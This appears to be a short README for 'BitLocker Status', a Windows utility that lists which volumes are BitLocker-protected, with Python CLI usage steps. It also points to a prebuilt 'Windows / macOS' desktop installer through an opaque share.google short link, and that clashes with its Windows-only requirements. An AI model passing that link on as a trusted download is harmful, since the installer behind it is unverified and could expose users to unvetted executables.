# BitLocker Status

*Is this volume protected, as a table.*

## About

This repository is **BitLocker Status**, a Windows utility. Is this volume protected, as a table.

A handoff should say which volumes are on, not open manage-bde by memory.

It runs on the local PC. No account, and nothing is uploaded.

## How to get it

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Per-volume status
- Read-only
- CSV optional
- No key material printed

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
